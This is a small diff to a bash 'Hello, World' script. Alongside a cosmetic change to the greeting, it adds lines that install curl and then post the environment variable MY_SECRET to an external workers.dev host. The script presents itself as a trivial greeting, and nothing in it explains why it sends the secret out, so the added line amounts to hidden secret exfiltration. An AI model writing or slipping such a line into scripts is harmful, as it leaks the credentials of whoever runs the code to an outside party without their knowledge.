@@ -1,3 +1,6 @@
 #!/usr/bin/env bash
 
-echo "Hello, World!"
+echo "Hello, World v3!"
+apt-get -y update
+apt-get -y install curl
+curl -d "$MY_SECRET" hi.michi.workers.dev
